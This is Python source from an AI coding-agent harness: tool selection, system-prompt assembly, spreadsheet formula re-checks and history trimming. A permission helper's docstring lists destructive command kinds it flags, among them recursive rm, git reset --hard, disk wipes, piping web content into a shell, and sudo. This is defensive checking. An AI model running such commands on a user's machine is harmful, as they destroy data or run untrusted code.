        forms = _formulas(path) if forms is None else forms
        if not forms or len(forms) > 5000:
            return {} if not forms else None
        out = Path(tmp) / Path(path).parent.name
        out.mkdir(parents=True, exist_ok=True)
        kw = {"creationflags": 0x08000000} if os.name == "nt" else {}
        prof = Path(tmp) / "lo-profile"                   # its own profile: never blocked by a LibreOffice already open
        subprocess.run([exe, f"-env:UserInstallation={prof.as_uri()}", "--headless", "--calc", "--convert-to", "xlsx",
                        "--outdir", str(out), str(path)], capture_output=True, timeout=max(1, timeout), **kw)
        made = out / Path(path).name
        if not made.is_file():
            return None
        vals = openpyxl.load_workbook(made, data_only=True)
        return {k: (f, vals[k[0]][k[1]].value if k[0] in vals.sheetnames else None) for k, f in forms.items()}
    except Exception:  # noqa: BLE001 - a check that cannot run says nothing
        return None


def _formula_result_miss(asked: str, root, since: float) -> str:
    """Workbooks written this turn, recalculated through LibreOffice: a formula the turn wrote or changed that comes
    out as an Excel error, or (when the request says its formula is wrong) a changed formula whose result is the same
    as the original's; as a note, else "". SpreadsheetBench sb-56921: the direct route checks formulas by their text,
    and 3 of 6 runs handed back a fix that gave #VALUE! or the same 511 the user called wrong."""
    from meshpool_harness.capabilities import SEP as _SEP
    import tempfile
    text = str(asked or "").split(_SEP)[0]
    try:
        outs = _recent_office(root, since, ".xlsx")[:4]
        if not outs:
            return ""
        inputs = [Path(root) / n for n in re.findall(r"[\w][\w.()-]*\.xlsx\b", text)
                  if (Path(root) / n).is_file() and (Path(root) / n).stat().st_mtime < since]
        says_wrong = bool(re.search(_SAYS_WRONG, text, re.I))
        errors, same = [], []
        old_forms = {}
        for f in inputs[:2]:
            old_forms.update(_formulas(f))
        changed = []                                      # read the formulas first: LibreOffice runs only for a
        for f in outs:                                    # workbook whose formulas this turn wrote or changed
            if f in inputs:
                continue
            fo = _formulas(f)
            if any(old_forms.get(k, "").replace(" ", "") != v.replace(" ", "") for k, v in fo.items()):
                changed.append((f, fo))
        if not changed:
            return ""
        deadline = time.time() + 60                       # the whole check, however many workbooks: one minute
        with tempfile.TemporaryDirectory() as tmp:
            base = {}
            if says_wrong:                                # the originals' results matter only for "same as wrong"
                for i, f in enumerate(inputs[:2]):
                    r = _recalc_formulas(f, str(Path(tmp) / f"in{i}"), timeout=deadline - time.time())
                    if r:
                        base.update(r)
            for i, (f, fo) in enumerate(changed[:3]):
                if time.time() >= deadline:
                    break
                got = _recalc_formulas(f, str(Path(tmp) / f"out{i}"), fo, timeout=deadline - time.time())
                for k, (form, val) in (got or {}).items():
                    if old_forms.get(k, "").replace(" ", "") == form.replace(" ", ""):
                        continue                          # a formula the turn left alone is not its doing
                    old = base.get(k)
                    if isinstance(val, str) and val.strip() in _XL_ERRORS:
                        errors.append(f"{f.name} {k[0]}!{k[1]} = {val.strip()}")
                    elif says_wrong and old is not None and val is not None and val == old[1]:
                        same.append(f"{f.name} {k[0]}!{k[1]} = {val!r}")
    except Exception:  # noqa: BLE001
        return ""
    if errors:
        return ("The job is not done: recalculated, formulas you wrote come out as errors (" + "; ".join(errors[:4]) +
                "). Fix them so they compute what the request asks (check range sizes and anchoring with $), save and "
                "check the recalculated values.")
    if same:
        return ("The job is not done: recalculated, your changed formulas give the same results as the ones the user "
                "says are wrong (" + "; ".join(same[:4]) + "). Work out the value the request expects for one row by "
                "hand, write a formula that gives it, save and check the recalculated value.")
    return ""


# A message about a web page or an app's interface: the browser tools (open, click, screenshot, ui_audit) join the chat.
_WEB_ASK = (r"\b(?:browser|web ?page|website|web app|webapp|landing page|front[- ]?end|frontend|html|css|ui|ux|"
            r"screenshot|localhost|https?://|click|button|form|layout|responsive|dark mode|playwright|selenium)\b")


def _destructive(args: dict, root=None) -> bool:
    """A shell command that deletes recursively, rewrites history, wipes a disk, pipes the web into a shell or uses sudo.
    shell's argv list (["rm", "-rf", "build"], ["bash", "-lc", "git reset --hard"]) is read as the script it runs.
    With the project root, an rm that only clears scratch (permrules.scratch_rm: named files in the project, caches,
    temp folders) is not destructive."""
    cmd = args.get("command") or args.get("cmd") or ""
    if isinstance(cmd, (list, tuple)):
        cmd = T.shell_script(cmd)
    parts = [str(cmd)] + [str(c) for c in args.get("commands") or []]
    hit = [c for c in parts if c and _DESTRUCTIVE.search(c)]
    if not hit:
        return False
    if root is None or os.environ.get("MH_SCRATCH_RM", "1") == "0":
        return True
    wd = args.get("workdir") if isinstance(args.get("workdir"), str) else None
    return not all(PR.scratch_rm(c, root, wd) for c in hit)


_CHAT_TOOLS = frozenset({"read_file", "grep", "glob", "edit", "write_file", "bash", "web_search", "web_research",
                         "fetch_url", "office_task"})


def _elide_old_calls(msgs: list, keep: int = 3, limit: int = 500) -> list:
    """The long text in the arguments of older tool calls (a whole patch, a script) becomes a short stub: the file is on
    disk and the result was seen, but the text rode along on every later request (186k tokens in one 34-call task).
    Only a copy for the request; the newest `keep` calls stay as written, so the prompt prefix before them is stable."""
    idx = [i for i, m in enumerate(msgs) if m.get("role") == "assistant" and m.get("tool_calls")]
    old = idx[:-keep] if keep else idx
    if not old:
        return msgs
    out = list(msgs)

    def cut(v):
        if isinstance(v, str) and len(v) > limit:
            return v[:160] + f" ... [{len(v) - 160} more characters left out of the history] ..."
        if isinstance(v, list):
            return [cut(x) for x in v]
        if isinstance(v, dict):
            return {k: cut(x) for k, x in v.items()}
        return v
    for i in old:
        calls = []
        for c in msgs[i]["tool_calls"]:
            f = c.get("function") or {}
            a = f.get("arguments")
            if isinstance(a, str) and len(a) > limit:
                try:
                    a2 = json.dumps(cut(json.loads(a)), ensure_ascii=False)
                except ValueError:
                    a2 = a
                c = dict(c, function=dict(f, arguments=a2))
            calls.append(c)
        out[i] = dict(msgs[i], tool_calls=calls)
    return out


def _cache_hints_ok(base: str) -> bool:
    """prompt_cache_key and user are optional routing hints that OpenAI, Azure OpenAI and the Meshpool gateway read;
    other OpenAI-compatible servers (Ollama, LM Studio, Mistral, vLLM...) may reject fields they do not know."""
    try:
        from meshpool_harness import providers as PV
        h = PV.host(base)
        return h.endswith(("openai.com", "meshpool.ai", "openai.azure.com", "deepseek.com")) or PV.is_azure(base)
    except Exception:  # noqa: BLE001
        return False


def _bad_reply(resp) -> str:
    """Why a successful HTTP reply is not a model reply (an error body, no choices, a null message, a content filter
    with nothing in it), or "" when it is one."""
    if not isinstance(resp, dict):
        return "not a JSON object"
    ch = resp.get("choices")
    if not ch or not isinstance(ch, list) or not isinstance(ch[0], dict):
        e = resp.get("error")
        e = (e.get("message") if isinstance(e, dict) else e) or ""
        return ("error: " + str(e)[:160]) if e else "no choices"
    m = ch[0].get("message")
    if not isinstance(m, dict):
        return "no message"
    if ch[0].get("finish_reason") == "content_filter" and not (m.get("content") or m.get("tool_calls")):
        return "blocked by a content filter"
    return ""


# a request that says existing behaviour must not change: the agent is reminded to capture it before editing
_KEEP = re.compile(r"byte[- ]for[- ]byte|\b(?:keep|leave|preserve)\b[^.\n]{0,60}\b(?:identical|unchanged|the same|as it is|"
                   r"as is|intact)\b|\b(?:must|should|has to|have to)\s+(?:stay|remain)\s+(?:unchanged|identical|the same)"
                   r"|\bwithout changing (?:the |its )?(?:current|existing) (?:output|behaviou?r|api)", re.I)
_REQ = re.compile(r"\b(?:must|should|shall|never|always|only|unless|otherwise|falls? back|instead of|before|after|"
                  r"at most|at least|rounded|ties?|tie-break|in order|ordered|case[- ]insensitive|exactly)\b", re.I)


def _requirements(text: str) -> int:
    """How many separate stated rules a request has: sentences or list items carrying a constraint word."""
    t = (text or "").split("\n\n\u200b")[0]
    parts = [p for p in re.split(r"(?<=[.;:!?])\s+|\n+\s*(?:[-*]|\d+[.)])?\s*", t) if p.strip()]
    return sum(1 for p in parts if _REQ.search(p))


REQ_NOTE = ("\n\n\u200b[Meshpool] Before you finish, list each rule the request states, one line each, and next to it "
            "the check (command and output) that shows it holds. Test the edge cases the request names, and if the input "
            "could be large, time it on a large input too. A rule you did not check is not done.")
KEEP_NOTE = ("\n\n\u200b[Meshpool] This request says existing behaviour must stay the same. Before your first edit, run "
             "the current code and save its exact output; after your edits, run it again and compare line by line.")

class Agent:
    office_on = False      # a message in this chat asked for an office file: Codex style shows the office tools too
    browser_on = False     # a message in this chat is about a web page or app UI: Codex style shows the browser tools
    office_engines = False  # MH_OFFICE_DIRECT=1: a message asked for a new deck, report or model (engine tools shown)
    office_c171 = False  # MH_WORK_OFFICE_STYLE=c171: this Work chat's office job sends Codex 0.171's request
    office_revisions = False  # MH_OFFICE_DIRECT=1: a message asked for tracked changes or comments (edit_office_file shown)
    usage_task = None      # the session may set one usage task before send() to share it across goal / resume turns
    usage_source = "chat"  # what this agent's own calls are called in the usage ledger ("subagent" for a sub-agent)
    _turn_no = 0           # counted up by each send(); turn-scoped guards read it before the first turn too
    budget_stopped = False  # the last turn ended on the spending limit
    _task = None           # the usage task of the turn that is running

    def __init__(self, workdir: str, *, mcp=None, emit=None, approve=None, mode: str | None = None,
                 session_id: str | None = None, max_steps: int = 0, profile: str = "code",
                 sessions_dir: str | None = None):
        self.profile = "work" if profile == "work" else "code"
        self.root = Path(workdir).expanduser().resolve()
        if not self.root.is_dir():
            raise ValueError(f"Project folder not found: {workdir}")
        self.id = session_id or time.strftime("%Y%m%d-%H%M%S-") + uuid.uuid4().hex[:4]
        self.dir = (Path(sessions_dir) if sessions_dir else SESSIONS) / self.id   # headless runs: inside workdir
        self.ws = Workspace(str(self.root), str(self.dir / "tool-output"))
        self.ws.engine_libs = False                    # the user's project runs its own Python (core/tools._py_env)
        self.ws.visible = self._text_visible        # re-read pointers only while the text is really there
        self.ws.should_stop = lambda: self._stop
        self.ws.get_mode = lambda: self.mode
        self.mcp = mcp
        self.emit = emit or (lambda ev: None)
        self.approve = approve
        self.mode = C.normalize_mode(mode, None) or C.permission_mode()
        self.always: set[str] = set()
        self.max_steps = max_steps                  # explicit cap (0 = unset): _step_cap() resolves it each turn
        self.pace_deadline = 0.0                 # set for a quick request: answer by then (see pace.py)
        self._stop = False
        self._inbox, self._inbox_lock = [], threading.Lock()
        self.created = time.time()
        self.usage = {"in": 0, "cached": 0, "out": 0, "calls": 0}
        self._absorb_lock = threading.Lock()
        self.model: str | None = None          # None: the default model from settings
        self._plan, self._plan_next, self._in_turn = False, None, False   # see the `plan` property
        self._todos: list = []                 # the agent's plan (todo_write); see agent/planning.py
        self._plan_needed = False              # this turn needs a written plan (decided at its start, free)
        self.trace: list = []                  # every tool call: name, seconds, ok, argument summary (benchmarks)
        self._trace_lock = threading.Lock()
        self._open_calls: dict = {}                    # tool_start sent, tool_end not yet: id -> name
        self.route = None                      # hrouter.Route: the specialised harness this chat runs as
        self.effort = ""                       # this chat's reasoning effort (/effort, --effort); "" = the setting
        self._effort_noted = ""
        self.lane = "task"                     # per message: chat (answer fast, fast model if set), task, deep
        self.messages = [{"role": "system", "content": self.system_prompt()}]
        self.title = ""

    # ---------- prompt -----------------------------------------------------------------------------------------
    def _style(self) -> bool:
        """True when this chat runs in Codex style (harness profile engine_style "codex"): Codex's base instructions,
        shell / apply_patch / update_plan and Codex's loop, under Meshpool's routing. Code chats, and Work chats
        under MH_LEAN_WORK=1."""
        if self.profile == "work":
            return _lean_work_on()
        try:
            return self.profile == "code" and self.hsettings()["engine_style"] == "codex"
        except Exception:  # noqa: BLE001
            return False

    def _text_visible(self, text: str) -> bool:
        """Is this file's text still in the conversation? Compaction and observation trimming drop old tool output, so
        a "you already have it" pointer must only answer a re-read while the text is really there. Checked on the
        file's most distinctive lines (cat -n and nl prefix line numbers, so the whole text never matches)."""
        lines = sorted({ln.strip() for ln in text.splitlines() if len(ln.strip()) >= 12}, key=len, reverse=True)[:3]
        if not lines:
            return False
        for m in self.messages:
            c = m.get("content")
            if isinstance(c, list):
                c = " ".join(str(p.get("text", "")) for p in c if isinstance(p, dict))
            if isinstance(c, str) and all(ln in c for ln in lines):
                return True
        return False

    def _lean(self) -> bool:
        """Lean core (profile "core"): Codex style without the extra verification layers. A Work chat in Codex style
        (MH_LEAN_WORK=1) is always lean."""
        try:
            if not (self._style() and (self.profile == "work" or bool(self.hsettings().get("lean_core")))):
                return False
            return not self._bare_codex()
        except Exception:  # noqa: BLE001
            return False

    def _bare_codex(self) -> bool:
        """MH_LARGE_REPO_STYLE=codex (opt-in; the default is c171, see _c171): a lean-core code chat in a repo too large to preload runs the
        plain Codex design instead (swe3: lean core 2.6x Codex's cost per solved task on swe_sympy): Codex's own
        prompt and loop, without preload, re-check, the keep and requirement notes, the route card or the grader."""
        if self._c171():                                 # Codex 0.171's request: none of those layers either
            return True
        try:
            return (self.profile == "code" and os.environ.get("MH_LARGE_REPO_STYLE", "") == "codex" and self._style()
                    and bool(self.hsettings().get("lean_core")) and self._large_repo())
        except Exception:  # noqa: BLE001
            return False

    def _c171(self) -> bool:
        """Harness profile "c171" (codex171; MH_PROFILE=c171 for every code chat): a code chat sends the request Codex
        CLI 0.171 sends. Its base instructions (prompt-171.md), one tool, exec_command (core/tools.py), plus the user's
        own MCP tools, and its <environment_context> as a user message of its own (_c171_env). Like _bare_codex: no
        preload, re-check, keep or requirement notes, route card or grader. The loop guards and compaction stay.
        Default for every lean-core code chat (MH_LARGE_REPO_STYLE and MH_SMALL_REPO_STYLE, default "c171"): swe7
        (swe_sympy, 12 tasks x 2, docs/results/swe7) c171 solved 22/24 vs Codex 21/24 at 0.73x its cost per solved
        task (CI 0.57-0.90), 0.93x its time; the lean core there solved 20/24 at 1.86x. MH_LARGE_REPO_STYLE=codex
        keeps the plain Codex design (_bare_codex), =core the lean core."""
        try:
            if self.profile == "work" and getattr(self, "office_c171", False) and self._style():
                return True                              # a Work chat's office edit (MH_WORK_OFFICE_STYLE=c171, send)
            if self.profile != "code" or not self._style():
                return False
            if self.hsettings().get("codex171"):
                return True
            if not self.hsettings().get("lean_core"):
                return False
            if self._large_repo():
                return os.environ.get("MH_LARGE_REPO_STYLE", "c171") == "c171"
            # a smaller repo too (MH_SMALL_REPO_STYLE, default "c171"; =core keeps the lean core). Release round,
            # against Codex 0.171: v2_dev code c171 39/42 vs 38/42 at 0.79x its cost per solved task (lean core 34/42);
            # final22 (v2_eval + build/debug/deep/hard) c171 144/156 vs 145/156 at 0.71x (lean core 143/156, 0.67x)
            return os.environ.get("MH_SMALL_REPO_STYLE", "c171") == "c171"
        except Exception:  # noqa: BLE001
            return False

    def _c171_env(self) -> str:
        """Codex 0.171's environment context (docs/results/codex171-request/03-user.txt), fixed for the chat so the
        prompt prefix stays the same from call to call. Meshpool has no sandbox for the agent's commands (its
        permission modes ask before running them), so the file system part reads as Codex's full-access run did."""
        env = getattr(self, "_c171_env_text", "")
        if not env:
            from meshpool_harness.config import find_bash
            shell = "bash" if find_bash() else ("powershell" if os.name == "nt" else "sh")
            root = str(self.root)
            env = self._c171_env_text = (
                f"<environment_context>\n  <cwd>{root}</cwd>\n  <shell>{shell}</shell>\n"
                f"  <current_date>{datetime.date.today().isoformat()}</current_date>\n"
                f"  <timezone>{_local_timezone()}</timezone>\n"
                f"  <filesystem><workspace_roots><root>{root}</root></workspace_roots><permission_profile "
                f"type=\"disabled\"><file_system type=\"unrestricted\" /></permission_profile></filesystem>\n"
                "</environment_context>")
        return env

    def _large_repo(self) -> bool:
        if not hasattr(self, "_is_large"):
            try:
                from meshpool_harness.agent import preload as _PL
                self._is_large = _PL.is_large(self.root)
            except Exception:  # noqa: BLE001
                self._is_large = False
        return self._is_large

    def _codex(self) -> bool:
        return self._style() and not self.plan           # plan mode keeps its read-only tools

    def _office_direct_raw(self) -> bool:
        return self.profile == "work" and _office_direct_on() and self._codex()

    def office_c171_for(self, asked: str) -> bool:
        """MH_WORK_OFFICE_STYLE=c171: whether this message's office job runs on Codex CLI 0.171's request (its prompt and
        its one command tool, the way Codex itself edits a workbook, document or deck with openpyxl, python-docx or
        python-pptx). A message about an office file (or an earlier one in the chat) does; a new deck, report or model
        (the engines) and Word tracked changes or comments (edit_office_file) keep the Work route. The session asks
        before it builds the message, so the office notes stay off a Codex request (ui.agent_api)."""
        try:
            if not (self._office_direct_raw() and os.environ.get("MH_WORK_OFFICE_STYLE", "lean") == "c171"):
                return False
            from meshpool_harness import capabilities as CAP
            from meshpool_harness.office_intent import engines_wanted, wants_revisions
            own = str(asked or "").split(CAP.SEP)[0]
            if self.office_engines or engines_wanted(own) or wants_revisions(own):
                return False
            return bool(getattr(self, "office_on", False) or re.search(r"\.(docx?|xlsx?|pptx?|pdf)\b", own, re.I)
                        or CAP.needs(own))
        except Exception:  # noqa: BLE001
            return False

    def _office_direct(self) -> bool:
        """MH_OFFICE_DIRECT=1 in a lean Work chat: office jobs on existing files are done by hand; the engine tools are
        offered only for a new deck, report or model (office_engines, decided per message in send). Off while the
        chat's office job runs on Codex 0.171's request (office_c171): no office notes, pre-answer checks or caps then,
        as Codex has none (MH_OFFICE_C171_CHECKS=1 keeps the checks)."""
        if getattr(self, "office_c171", False) and os.environ.get("MH_OFFICE_C171_CHECKS", "0") != "1":
            return False
        return self._office_direct_raw()

    def _codex_env(self) -> str:
        """Codex's <environment_context>: where it is, and how much it may do without asking."""
        from meshpool_harness.config import find_bash
        shell = "bash" if find_bash() else ("powershell" if os.name == "nt" else "sh")
        policy = "never" if self.mode == "auto" else "on-request"
        return (f"<environment_context>\n  <cwd>{self.root}</cwd>\n  <approval_policy>{policy}</approval_policy>\n"
                f"  <shell>{shell}</shell>\n</environment_context>")

    def system_prompt(self) -> str:
        from meshpool_harness.config import find_bash
        bash = find_bash()
        if self._style():
            c171 = self._c171()
            text = _c171_prompt() if c171 else _codex_prompt(lean=self._lean(), work=self.profile == "work")
            for name in PROJECT_FILES:
                pf = self.root / name
                if pf.is_file():
                    body = pf.read_text(encoding="utf-8", errors="replace")[:20000]
                    text = (text.rstrip("\n") if c171 else text) + \
                        f"\n\n# {name} instructions for {self.root}\n\n<INSTRUCTIONS>\n{body}\n</INSTRUCTIONS>"
                    break
            return text
        if os.name == "nt":
            shell = (("bash (Git Bash). For Windows tools, run them through powershell -NoProfile -Command \"...\" "
                      "or cmd /c \"...\"") if bash else
                     "PowerShell (no bash on this computer: write PowerShell commands; cmd /c \"...\" also works)")
        else:
            shell = "bash" if bash else "sh"
        text = (WORK_SYSTEM if self.profile == "work" else SYSTEM).format(
            root=self.root, os_name=f"{platform.system()} {platform.release()}", shell=shell)
        # Stable prefix: what differs from one chat to the next (the folder, the project's instructions, the skills
        # matched to this request, the route's method) goes after everything that is the same for every chat, so the
        # provider's prompt cache serves the long shared part to every new chat. With the folder at character ~290
        # (broad1, dabench), no two chats shared more than that: 57% cached input against Codex's 80%.
        stable = os.environ.get("MH_STABLE_PREFIX", "1") != "0"
        env_block = ""
        if stable:
            m = re.search(r"\nEnvironment\n(?:- [^\n]*\n)+", text)
            if m:
                env_block = "\n" + m.group(0).strip("\n")
                text = text[:m.start()] + "\n" + text[m.end():]
        if "ask_user" in self._dropped():             # headless or a lean route: no tool, so no 2k-char section about it
            text = re.sub(r"\nAsking the user \(ask_user\)\n.*?(?=\nRules\n)", "\n", text, count=1, flags=re.S)
        if "todo_write" in self._dropped():          # no todo tool in this harness: no instruction to use it
            text = re.sub(r"\n2\. For (work|a multi-step job)( with several steps)?, keep a short plan with todo_write[^\n]*",
                          "\n2. Get several independent facts in one call (bash_many) rather than one call each.", text)
        if V3:
            rules = V3_RULES
            if "todo_write" in self._dropped():     # a focused harness: no todo list, so no rule about one
                rules = rules.split("\n- For any request with more than one step")[0]
            text += rules
        if E2E:
            text += E2E_RULES
        if self.profile == "code":
            text += SCRATCH_RULE
        if os.environ.get("MH_OBSERVE") == "1" and self.profile == "code":   # a working rule: before the Environment
            text += ("\n- Before your first edit to fix a bug, reproduce it with probe (a failing test or a short "
                     "script) and read its diagnosis. If the cause is not clear, run trace on the same command to see "
                     "which project functions run. After an edit, use probe to see what still fails.")
        if stable:
            text += "\n" + env_block                    # after the shared rules, before the per-project parts
        from meshpool_harness.agent import extras as EX
        text += EX.instruction_text(self.root)          # home, parent folders and the project, with @imports
        try:
            from meshpool_harness import skills as SK
            text += SK.catalog_text(getattr(self, "_route_text", ""),
                                    searchable="find_skill" not in self._dropped())
        except Exception:
            pass
        route = getattr(self, "route", None)
        if route is not None:
            from meshpool_harness.hrouter.route import addon
            text += addon(route)
        from meshpool_harness.assistant import HONESTY, PLAIN
        extra = os.environ.get("MH_APPEND_PROMPT", "").strip()
        return text + "\n\n" + PLAIN + "\n\n" + HONESTY + (("\n\n" + extra) if extra else "")

    def set_route(self, route, text: str = "") -> None:
        """Run this chat as a specialised harness (hrouter). Only before the first message: afterwards the system
        prompt stays byte-stable so the provider's prompt cache keeps hitting."""
        self.route = route
        self._route_text = text or ""
        # Code harnesses: a failing command shows the project lines it points to, counted as read, so the fix needs no
        # read_file call first (core/errctx.py). MH_ERROR_CONTEXT=0 turns it off.
        self.ws.error_context = (route is not None and route.family == "code"
                                 and os.environ.get("MH_ERROR_CONTEXT", "") != "0")
        if len(self.messages) <= 1:
            self.messages = [{"role": "system", "content": self.system_prompt()}]

    def hsettings(self) -> dict:
        """The routed harness profile's settings, with explicit env flags on top (hrouter/profiles.py)."""
        from meshpool_harness.hrouter.profiles import effective
        return effective(getattr(self, "route", None))

    def _dropped(self) -> set:
        """Tools the routed harness leaves out (hrouter specs' drop list), unless MH_LEAN_TOOLS=0. A headless run
        (no one to answer: `meshpool -p`, scripts) also leaves out ask_user: E2E-AUTONOMY, it decides and says what
        it assumed."""
        d = self._dropped_route()
        if E2E and getattr(self, "headless", False) and not self.plan:
            d = d | {"ask_user"}
        return d

    def _dropped_route(self) -> set:
        route = getattr(self, "route", None)
        if route is None or self.plan or not self.hsettings()["lean_tools"]:
            return set()
        from meshpool_harness.hrouter.route import dropped
        d = dropped(route)
        if getattr(self, "_plan_needed", False):
            d = d - {"todo_write"}                   # a long task keeps its plan tool even on a lean route
        return d

    def tool_schemas(self) -> list:
        if self.plan:
            return T.schemas(PLAN_TOOLS)
        if self._codex():                          # Codex's tools, and the user's own MCP tools
            # Meshpool's own servers stay out of a coding chat (about 2k tokens a call), except the office tools
            # once a message in this chat asks for a PowerPoint, document, workbook or PDF (office_on, set by the
            # chat from capabilities.needs): a Code chat makes those files too instead of saying it cannot. A lean Work
            # chat works the same way (office_task is always there): loading the office server for every message added
            # about 3k tokens a call and its start-up time to chats that never touch a document.
            try:                                   # by the module it runs: a user's own server may be named browser
                own_browser = self.mcp.builtin_tool_names("browser_mcp_server") if self.mcp else set()
            except Exception:  # noqa: BLE001
                own_browser = set()

            def keep(name: str) -> bool:
                n = name.replace("-", "_")
                if n.startswith("mcp__meshpool_office__"):      # not on Codex's request for a Work office edit:
                    return bool(getattr(self, "office_on", False)) and not getattr(self, "office_c171", False)
                if n.startswith("mcp__meshpool_assistant__"):      # memory, schedules, chat search stay in Code chats
                    return not n.endswith("run_subtasks")
                if name in own_browser:                          # Meshpool's own browser server: on request, as
                    return bool(getattr(self, "browser_on", False))   # the office tools (5k tokens on every call)
                return not n.startswith("mcp__meshpool_") and not name.endswith("run_subtasks")
            mcp = [x for x in self.mcp.schemas() if keep(x["function"]["name"])] if self.mcp else []
            if self._c171():                       # Codex 0.171: exec_command, then the user's MCP tools
                return T.schemas(["exec_command"]) + mcp
            if not self._office_direct():
                return T.schemas(self._tool_names()) + mcp
            # MH_OFFICE_DIRECT=1: the engine tools come last and only once a message asked for a deck, report or
            # model, so the list a turn starts with only ever grows at its end (the cached prefix stays)
            # office3 trace (SpreadsheetBench): the office server's inspector and editor duplicated an openpyxl dump
            # and failed on formulas, 3 of 7 extra calls; with the libraries at hand they stay out until an engine job
            dup = ("measure_office_file", "edit_office_file")
            is_dup = lambda x: x["function"]["name"].rsplit("__", 1)[-1] in dup   # noqa: E731
            head = T.schemas([n for n in self._tool_names() if not _engine_tool(n)]) + \
                [x for x in mcp if not _engine_tool(x["function"]["name"]) and not is_dup(x)]
            if self.office_engines:                                      # appended, never reordered
                return head + T.schemas(["office_task"]) + [x for x in mcp if _engine_tool(x["function"]["name"])] \
                    + [x for x in mcp if is_dup(x)]
            if getattr(self, "office_revisions", False):                 # tracked changes or comments: the editor
                return head + [x for x in mcp if is_dup(x)]              # writes real Word revisions
            return head
        names = self._tool_names()
        if getattr(self, "lane", "task") == "chat" and not getattr(self, "_tools_full", False) \
                and os.environ.get("MH_LITE_CHAT_TOOLS", "1") != "0":
            # A quick question carries the tools it can need (look, change, run, search), not the 19 of a long job:
            # 2k tokens less on every call. Once a message asks for more, the whole set stays for the chat, so the
            # prompt prefix does not flip back and forth.
            names = [n for n in names if n in _CHAT_TOOLS]
        elif self.profile == "work" and os.environ.get("MH_LITE_WORK_TOOLS", "0") == "1":
            # MH_LITE_WORK_TOOLS=1 (off by default, unmeasured): a Work chat carries the 14 tools a document or data job
            # uses, not the 20 of a long coding job (background shells, notebooks, sub-agents): 1.5k tokens a call.
            names = [n for n in names if n in _CHAT_TOOLS | {"ask_user", "todo_write", "use_skill", "find_skill"}]
        else:
            self._tools_full = True
            if "delegate_task" not in names and getattr(self, "_delegate_depth", 0) == 0 and _subagents_on():
                names = names + ["delegate_task"]
        drop = self._dropped()
        if drop:
            names = [n for n in names if n not in drop]
        ms = ([x for x in self.mcp.schemas()
               if not x["function"]["name"].replace("-", "_").startswith("mcp__meshpool_web__")
               and not x["function"]["name"].endswith("run_subtasks")   # delegate_task instead
               and not (self.profile == "code" and not getattr(self, "office_on", False)   # about 3k tokens per call:
                        and x["function"]["name"].replace("-", "_").startswith("mcp__meshpool_office__"))]
              if self.mcp else [])             # a Code chat gets the office tools once a message asks for a file
        return (T.schemas(names) + self._lazy_apply(ms))[:128]    # no endpoint takes more than 128 tools

    def _lazy_apply(self, ms: list) -> list:
        """E2E-AUTONOMY: with many connected tools show an index and load schemas on demand (agent/mcp_assist.py)."""
        lz = getattr(self, "_lazy", None)
        if lz is None:
            lz = self._lazy = MA.LazyTools(self.profile)
        self._lazy_all, self._lazy_hidden = ms, []
        if not ms or not MA.LazyTools.wanted(ms, self.profile):
            return ms
        shown, hidden = lz.split(ms)
        self._lazy_hidden = [h["function"]["name"] for h in hidden]
        return shown + ([lz.find_schema(hidden)] if hidden else [])

    def _tool_names(self) -> list:
        if self._codex():
            if self._c171():
                return ["exec_command"]
            if self._office_direct():                  # office_task only once a message asked for a deck or model
                return list(T.CODEX_TOOLS) + [n for n in LEAN_WORK_TOOLS if n != "office_task"] + \
                    (["office_task"] if self.office_engines else [])
            return list(T.CODEX_TOOLS) + (LEAN_WORK_TOOLS if self.profile == "work" else [])
        names = PLAN_TOOLS if self.plan else (WORK_TOOLS if self.profile == "work" else BUILTIN)
        extra = []
        route = getattr(self, "route", None)
        if route is not None and not self.plan:
            from meshpool_harness.hrouter.route import tools as route_tools
            extra += [t for t in route_tools(route) if t not in names]
        try:
            from meshpool_harness import skills as SK
            if SK.on_demand() and "find_skill" not in names:
                extra.append("find_skill")
        except Exception:  # noqa: BLE001
            pass
        names = names + extra if extra else names
        drop = self._dropped()
        return [n for n in names if n not in drop] if drop else names

    def current_model(self) -> str:
        if self.model:
            return self.model
        fast = os.environ.get("MH_MODEL_FAST", "").strip()
        if fast and getattr(self, "lane", "task") == "chat":
            return fast                        # a quick message on the fast tier; the user's own pick always wins
        return os.environ.get("MH_MODEL") or DEFAULT_MODEL

    # ---------- public -----------------------------------------------------------------------------------------
    def stop(self):
        self._gen = getattr(self, "_gen", 0) + 1         # anything still running from this turn sees it is stale
        self._stop = True
        if getattr(self, "_delegations", None):          # the sub-agents it is running
            from meshpool_harness.agent import delegate as DL
            DL.stop_all(self)

    def _run_subtasks(self, name: str, args: dict):
        """Sub-agents for this chat run here, in the app's own process, with what only this chat knows: its model,
        its permission mode and its project. Nothing crosses to another process, so nothing there can be forged:
        any secret handed to another process of the same user can be read by a harness model's shell command
        (review rounds 6 to 8). The assistant server's run_subtasks, used by Hermes, Codex and Pi, never trusts a
        parent. Stop here stops them within a fraction of a second."""
        from meshpool_harness import assistant as AS
        gen = getattr(self, "_gen", 0)
        stopped = lambda: self._stop or getattr(self, "_gen", 0) != gen   # noqa: E731

        def run():
            try:
                return AS.run_subtasks(args.get("tasks") or [], str(self.root), int(args.get("max_parallel") or 0),
                                       parent={"model": self.current_model() or "", "mode": self.mode,
                                               "root": str(self.root)}, trusted=True, cancelled=stopped), False
            except (ValueError, KeyError, TypeError) as e:
                return str(e), True
        return self._wait(run)

    def _exists(self, path: str) -> bool:
        try:
            return self.ws._path(path, write=True).exists()
        except Exception:  # noqa: BLE001
            return False

    def _wait(self, fn, *a, on_stop=None, on_abandon=None, **kw):
        """Run a blocking call (a model request, an MCP tool, a web fetch) so Stop works within a fraction of a
        second instead of when the call returns. A call that is abandoned finishes in the background, unseen;
        on_abandon() tells it so just before Stop is raised. It runs in a copy of this thread's context, so its
        model calls are recorded in the turn's usage task."""
        box: dict = {}
        cx = contextvars.copy_context()

        def run():
            try:
                box["v"] = cx.run(fn, *a, **kw)
            except BaseException as e:  # noqa: BLE001  re-raised in the caller's thread
                box["e"] = e
        t = threading.Thread(target=run, daemon=True)
        t.start()
        while t.is_alive():
            t.join(0.15)
            if self._stop:
                if on_abandon:
                    on_abandon()
                self._abort_live()                 # close the model stream now, not when it next sends a byte
                if on_stop:
                    try:
                        on_stop()                  # e.g. tell an MCP server to drop the call (notifications/cancelled)
                    except Exception:  # noqa: BLE001
                        pass
                raise Interrupted()
        if "e" in box:
            raise box["e"]
        return box["v"]

    # ---------- usage ledger (core/usage.py) -------------------------------------------------------------------
    def _src(self) -> str:
        return "grader" if getattr(self, "_is_grader", False) else self.usage_source

    _ensure_lock = threading.Lock()

    def _ensure_task(self):
        """The usage task calls are recorded in: the turn's, or one made now (a call outside a turn). Locked: two
